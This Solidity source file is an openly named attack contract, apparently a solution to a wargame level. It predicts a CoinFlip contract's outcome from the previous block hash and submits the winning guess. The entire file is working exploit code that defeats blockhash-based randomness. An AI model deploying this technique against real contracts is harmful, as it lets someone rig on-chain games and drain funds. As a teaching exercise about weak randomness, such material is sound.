// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.7.3/contracts/utils/math/SafeMath.sol";


interface CoinFlip {
    function flip(bool) external;
}

contract CoinFlipAttack {
    using SafeMath for uint256;
    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function num() external view returns (uint256) {
        return block.number.sub(1);
    }

    function hash() external view returns (bytes32) {
        return blockhash(block.number.sub(1));
    }

    function attack(address target) external {
        uint256 lastHash = uint256(blockhash(block.number.sub(1)));
        uint256 ret = lastHash.div(FACTOR);
        bool status = ret == 1 ? true : false;
        CoinFlip(target).flip(status);
    }
}